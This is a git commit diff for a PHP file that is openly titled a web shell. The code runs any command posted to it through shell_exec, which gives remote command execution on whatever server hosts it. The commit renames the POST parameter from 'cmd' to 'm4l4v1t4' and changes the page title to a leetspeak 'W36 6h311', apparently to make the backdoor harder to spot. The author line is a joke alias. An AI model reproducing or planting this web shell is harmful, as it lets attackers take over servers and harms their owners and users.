316a6fcda24f52f6f4bb27e25758bf3e76ac7390
Piloto do Raio 2 do Centro de Detenção Provisória de Pinheiros (CDP III) cela 308 <98627927+m4l4v1t4@users.noreply.github.com>
2022-02-06 16:51:27 -0300

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <?php
-if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd']);
+if (!empty($_POST['m4l4v1t4'])) {
+    $cmd = shell_exec($_POST['m4l4v1t4']);
 }
 ?>
 <!DOCTYPE html>
@@ -9,7 +9,7 @@ if (!empty($_POST['cmd'])) {
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Web Shell</title>
+    <title>W36 6h311</title>
     <style>
         * {
             -webkit-box-sizing: border-box;
